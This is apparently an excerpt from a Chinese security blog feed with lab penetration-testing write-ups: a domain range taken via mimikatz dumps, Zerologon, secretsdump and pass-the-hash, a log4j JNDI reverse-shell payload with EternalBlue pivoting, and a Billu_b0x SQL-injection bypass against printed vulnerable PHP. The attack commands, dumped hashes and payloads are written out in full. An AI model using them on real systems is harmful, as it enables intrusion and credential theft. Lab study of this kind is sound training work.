<span class="hljs-number">1</span><br>User Name         : DWM<span class="hljs-number">-1</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-90</span><span class="hljs-number">-0</span><span class="hljs-number">-1</span><br>msv :<br> [<span class="hljs-number">00000005</span>] Primary<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * NTLM     : edb4ca24fe2a272ee1b85ec1142eaefa<br> * SHA1     : <span class="hljs-number">6</span>c7475cd2fd128806de6c679619b197d297bd92c<br>tspkg :<br>wdigest :<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * Password : (null)<br>kerberos :<br> * Username : WIN2016$<br> * Domain   : vulntarget.com<br> * Password : <span class="hljs-number">7</span>e <span class="hljs-number">29</span> e6 e6 <span class="hljs-number">36</span> <span class="hljs-number">37</span> d7 <span class="hljs-number">91</span> <span class="hljs-number">04</span> <span class="hljs-number">04</span> d4 <span class="hljs-number">4</span>a <span class="hljs-number">5</span>a bb fc f1 <span class="hljs-number">39</span> e5 c0 <span class="hljs-number">31</span> <span class="hljs-number">22</span> ae <span class="hljs-number">33</span> <span class="hljs-number">80</span> <span class="hljs-number">2</span>c e2 <span class="hljs-number">9</span>e <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">1</span>f <span class="hljs-number">87</span> d2 fc b9 <span class="hljs-number">85</span> c1 <span class="hljs-number">4</span>b <span class="hljs-number">5</span>c <span class="hljs-number">19</span> <span class="hljs-number">69</span> <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">15</span> <span class="hljs-number">5</span>e f4 <span class="hljs-number">1</span>e d8 <span class="hljs-number">33</span> ed <span class="hljs-number">2</span>a a7 <span class="hljs-number">72</span> <span class="hljs-number">1</span>b d2 <span class="hljs-number">60</span> <span class="hljs-number">73</span> f7 <span class="hljs-number">70</span> a6 b6 <span class="hljs-number">1</span>a a8 <span class="hljs-number">56</span> cd <span class="hljs-number">34</span> <span class="hljs-number">8</span>f <span class="hljs-number">55</span> <span class="hljs-number">98</span> <span class="hljs-number">70</span> bf <span class="hljs-number">26</span> c5 b4 c9 <span class="hljs-number">89</span> <span class="hljs-number">22</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>f <span class="hljs-number">94</span> <span class="hljs-number">9</span>f <span class="hljs-number">9</span>f <span class="hljs-number">74</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>e ba <span class="hljs-number">4</span>b ca <span class="hljs-number">59</span> df <span class="hljs-number">7</span>d f9 <span class="hljs-number">0</span>a <span class="hljs-number">93</span> <span class="hljs-number">35</span> <span class="hljs-number">86</span> <span class="hljs-number">75</span> f0 <span class="hljs-number">10</span> <span class="hljs-number">92</span> ba <span class="hljs-number">22</span> f3 <span class="hljs-number">08</span> a7 <span class="hljs-number">40</span> <span class="hljs-number">8</span>f b4 <span class="hljs-number">17</span> cd ad ab bc <span class="hljs-number">17</span> ad e8 <span class="hljs-number">17</span> <span class="hljs-number">7</span>b <span class="hljs-number">52</span> c0 eb f8 <span class="hljs-number">91</span> c8 d7 <span class="hljs-number">2</span>d <span class="hljs-number">65</span> <span class="hljs-number">23</span> b4 <span class="hljs-number">2</span>f <span class="hljs-number">37</span> f4 <span class="hljs-number">0</span>b <span class="hljs-number">17</span> e8 <span class="hljs-number">26</span> <span class="hljs-number">58</span> <span class="hljs-number">0</span>a <span class="hljs-number">81</span> <span class="hljs-number">9</span>e <span class="hljs-number">8</span>d <span class="hljs-number">70</span> b9 <span class="hljs-number">0</span>a <span class="hljs-number">3</span>e <span class="hljs-number">8</span>d a9 d6 <span class="hljs-number">62</span> cb d8 <span class="hljs-number">75</span> <span class="hljs-number">18</span> <span class="hljs-number">70</span> <span class="hljs-number">91</span> <span class="hljs-number">77</span> ed <span class="hljs-number">7</span>e ff c7 <span class="hljs-number">4</span>e <span class="hljs-number">14</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">97</span> <span class="hljs-number">0</span>d b7 <span class="hljs-number">58</span> <span class="hljs-number">4</span>d a2 d1 b2 b1 fd <span class="hljs-number">82</span> <span class="hljs-number">9</span>d <span class="hljs-number">11</span> af b5 bf ee <span class="hljs-number">23</span> e7 <span class="hljs-number">03</span> c9 a8 c9 <span class="hljs-number">5</span>a <span class="hljs-number">66</span> <span class="hljs-number">94</span> <span class="hljs-number">49</span> eb ca <span class="hljs-number">85</span> <span class="hljs-number">08</span> <span class="hljs-number">1</span>c f8 <span class="hljs-number">02</span> e3 <span class="hljs-number">81</span> <span class="hljs-number">67</span> f0 <span class="hljs-number">12</span> <span class="hljs-number">07</span> <span class="hljs-number">50</span> <span class="hljs-number">33</span> bd <span class="hljs-number">2</span>d <span class="hljs-number">42</span> <span class="hljs-number">7</span>f <span class="hljs-number">46</span> <span class="hljs-number">45</span> <span class="hljs-number">84</span> <span class="hljs-number">2</span>f <span class="hljs-number">71</span> <span class="hljs-number">9</span>e <span class="hljs-number">7</span>f a0 <span class="hljs-number">5</span>d <span class="hljs-number">01</span> fb <span class="hljs-number">7</span>c <span class="hljs-number">86</span> f7 <span class="hljs-number">08</span> bf <span class="hljs-number">97</span> <span class="hljs-number">14</span> <span class="hljs-number">91</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>a a5 <span class="hljs-number">9</span>c e4 <span class="hljs-number">73</span> <span class="hljs-number">85</span> <span class="hljs-number">18</span> f3 c9 f7 <span class="hljs-number">24</span> <br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">997</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e5</span>)<br>Session           : Service from <span class="hljs-number">0</span><br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-19</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>kerberos :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">40925</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00009</span>fdd)<br>Session           : UndefinedLogonType from <span class="hljs-number">0</span><br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">14</span><br>SID               : <br>msv :<br> [<span class="hljs-number">00000005</span>] Primary<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * NTLM     : edb4ca24fe2a272ee1b85ec1142eaefa<br> * SHA1     : <span class="hljs-number">6</span>c7475cd2fd128806de6c679619b197d297bd92c<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">999</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e7</span>)<br>Session           : UndefinedLogonType from <span class="hljs-number">0</span><br>User Name         : WIN2016$<br>Domain            : VULNTARGET<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">14</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * Password : (null)<br>kerberos :<br> * Username : win2016$<br> * Domain   : VULNTARGET.COM<br> * Password : (null)<br>ssp :<br>credman :<br><br>mimikatz(commandline) # exit<br>Bye!<br></code></pre></td></tr></table></figure><p>去解密一下域内用户</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126146.png" alt="image">​</p><p>‍</p><p>noPac直接打？–&gt; hhs是可以打的 估计只能打一次吧，后续我一直报错已存在对象 ，估计是环境存在问题</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126250.png" alt="cc83d63ff5e5b1460c7a4ee97daccd7">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126377.png" alt="a2fe4c56bff19f68758ea03d6c1125e">​</p><p>所以我就换了个洞，打zerologon  横向移动-域控提权-CVE-2020-1472(Zerologon)</p><p>先探测</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python Zero_test.py win2019 <span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126500.png" alt="image">​</p><p>先打</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python cve<span class="hljs-number">-2020</span><span class="hljs-number">-1472</span>-exploit.py win2019 <span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126626.png" alt="image">​</p><p>‍</p><p>然后在导出Administrator的hash</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">proxychains python3 secretsdump.py vulntarget.com/win2019\$@<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span> -just-dc-user <span class="hljs-string">&quot;vulntarget\administrator&quot;</span> -no-pass<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126766.png" alt="image">​</p><p>拿到hash横向到域控</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">proxychains python3 psexec.py vulntarget.com/administrator@<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span> -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15<br></code></pre></td></tr></table></figure><p>拿下域控</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126910.png" alt="image">​</p><p>‍</p><h2 id="拓扑分析"><a href="#拓扑分析" class="headerlink" title="拓扑分析"></a>拓扑分析</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126033.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - 内部环境 - 某域渗透靶场-2</title>
    <link href="/post/target-internal-environment-a-certain-domain-penetration-of-the-shooting-range-2-z1o0fjq.html"/>
    <url>/post/target-internal-environment-a-certain-domain-penetration-of-the-shooting-range-2-z1o0fjq.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><p>本次的靶机是非常有意义的，也是算是一个很好的入门吧  涉及知识点如下</p><ol><li>log4j的RCE</li><li>内网MS17010</li><li>域渗透</li></ol><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机为192.168.0.129</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126334.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">masscan -p 1-65535 192.168.0.129 --rate=1000<br></code></pre></td></tr></table></figure><p>这里用masscan好点，其他的fscan基本都是扫不到的，所以以后还是用masscan吧，舒服多了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126661.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126814.png" alt="image">​</p><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.0.129 -sC -p 38080<br></code></pre></td></tr></table></figure><p>没啥东西 发现是springboot的常规报错，尝试用springboot工具扫一下没啥结果然后就用目录扫描工具扫一下站点发现有个接口存在405</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126031.png" alt="image">​</p><p>访问了一下发现是如下回显</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126203.png" alt="image">​</p><p>发现切换了POST就存在200回显了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126328.png" alt="image">​</p><h2 id="log4j2-JNDI注入"><a href="#log4j2-JNDI注入" class="headerlink" title="log4j2 - JNDI注入"></a>log4j2 - JNDI注入</h2><p>由于作者说了是考log4j2所以就打了一下log4j2的payload 直接反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload=<span class="hljs-variable">$&#123;jndi:ldap://192.168.0.128:1389/Basic/ReverseShell/192.168.0.128/28888&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126453.png" alt="image">​</p><p>但是发现报错了</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126595.png" alt="image">​</p><p>尝试换个payload来打tomcaecho的利用链子发现成功反弹(很奇怪我就是不行，而且他并不出网，不知道是不是我本地环境的问题)</p><p>直接用tomcatecho的链子就可以打进了拿到root下flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126751.png" alt="image">并且这里拿到了一对账号密码猜测为ssh进行登录</p><p>在这里其实是节省了一步的，出题人应该没有考核docker逃逸</p><p>‍</p><h2 id="内网MS17010"><a href="#内网MS17010" class="headerlink" title="内网MS17010"></a>内网MS17010</h2><p>所以给了宿主机的ssh，所以可以直接扫内网，上传fscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan_amd64 -h 10.0.1.6/24<br></code></pre></td></tr></table></figure><p>发现存在ms17010直接上msf即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126878.png" alt="image">​</p><p>先传入frp代理进去</p><p>然后代理起msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> rhosts 10.0.1.7<br>run<br></code></pre></td></tr></table></figure><p>结果还是那个傻卵子问题，打了三遍没反应，试试不走proxychains直接设置代理来打</p><p>设置msf的全局代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">setg Proxies socks5:127.0.0.1:5000<br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>emm打了两遍还是不行，真离谱</p><p>尝试用正向链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> target 1<br></code></pre></td></tr></table></figure><p>成功拿到shell了(好难沃日)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126035.png" alt="image">​</p><p>在root桌面找到第二个flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126256.png" alt="image">​</p><p>‍</p><p>发现是system权限了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126398.png" alt="image">​</p><p>‍</p><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>抓密码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126537.png" alt="image">​</p><p>发现存在域 所以进行进程迁移到root组去查看域信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">migrate 1800 <br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126647.png" alt="image">​</p><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig<br></code></pre></td></tr></table></figure><p>发现存在第二张网卡</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126773.png" alt="image">​</p><p>那就上传fscan继续扫一下看看内网情况</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126881.png" alt="image">​</p><p>发现存在DC并且DC也是存在ms17010的所以建立隧道直接打</p><p>路由建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">run get_local_subnets<br>run post/multi/manage/autoroute<br></code></pre></td></tr></table></figure><p>但是发现并没有成功</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126006.png" alt="image">​</p><p>‍</p><p>后续想尝试上一下CS，所以有了如下操作 ，先在linux当中进行http隧道的搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./proxy http -t tcp -p <span class="hljs-string">&quot;0.0.0.0:8077&quot;</span> --daemon<br></code></pre></td></tr></table></figure><p>然后通过建立http隧道的马子来上线CS使用goproxy代理转发上线</p><p>然后建立socks5隧道</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126162.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126497.png" alt="image">​</p><p>然后走proxychains代理本地的端口即可</p><p>‍</p><p>因为抓到域内用户的账号密码 所以想到通过域提权漏洞直接梭哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python3 sam_the_admin.py <span class="hljs-string">&quot;redteam/root:Red12345&quot;</span> -de-ip 10.0.0.12 -shell<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126649.png" alt="image">​</p><p>拿到最后的flag在Administrator下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126854.png" alt="image">​</p><p>然后通过命令行开启3389 但是报了个什么编码错误 很裂开 搞了半天没成功 ..</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126965.png" alt="image">​</p><p>如果能进 3389就可以复制马过去 然后走socks5隧道进行上线CS</p><p>‍</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>log4j还是有点不熟悉，去复现一下</li><li>碰到域还是有点不知所措了</li><li>msf和cs的隧道配合起来用还真不错</li><li>内网穿透这个东西真的太重要了</li></ul><p>‍</p><h2 id="拓扑分析"><a href="#拓扑分析" class="headerlink" title="拓扑分析"></a>拓扑分析</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126104.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - VulnHub - Billu_b0x</title>
    <link href="/post/target-vulnhub-billub0x-z1w3oo4.html"/>
    <url>/post/target-vulnhub-billub0x-z1w3oo4.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>‍</p><p>192.168.223.137</p><p>端口扫描</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118823.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.223.137 -sC -p 22,80,25,110<br></code></pre></td></tr></table></figure><p>查看80端口</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118101.png" alt="image">​</p><p>明显注入吧 ，抓个包丢sqlmap中跑但是发现跑不出什么？仔细看一下</p><p>先扫了一下目录</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118316.png" alt="image">​</p><p>有个文件上传</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118519.png" alt="image">​</p><p>有个phpinfo</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118631.png" alt="image">​</p><p>有个phpmyadmin</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118755.png" alt="image">​</p><p>有个test</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118881.png" alt="image">​</p><p>‍</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>‍</p><p>emm比较多 先看文件上传吧看能不能直接getshell</p><p>确实能任意文件上传，但是不知道返回的路径啊 ？奇怪了，再试试弱口令进一下phpmyadmin也无果</p><p>但是在尝试test的时候发现存在了一个文件包含</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118009.png" alt="image">​</p><p>emm 尝试包含当前目录的一些文件比如index.php upload.php</p><p>访问后确实找到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;head.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]==<span class="hljs-literal">true</span> &amp;&amp;  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)<br>&#123;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are logged in :)&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span><br><span class="hljs-string">&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--&lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt;[[ billu b0x ]]&lt;/span&gt;--&lt;/font&gt; </span><br><span class="hljs-string">&lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">Show me your SQLI skills &lt;br&gt;</span><br><span class="hljs-string">&lt;form method=post&gt;</span><br><span class="hljs-string">Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br><span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are allowed&lt;br&gt;&quot;</span>;<br>   <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-literal">true</span>;<br>   <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>   <br> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>   <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显是一个将单引号替换为空的操作但是这里的写法是pass在前面uname在后面，所以可以构造payload通过</p><p>反引号转义单引号和万能密码即可成功登录</p><p>‍</p><p>payload是</p><p>un&#x3D;or 1&#x3D;1 #&amp;ps&#x3D;asd\</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061118211.png" 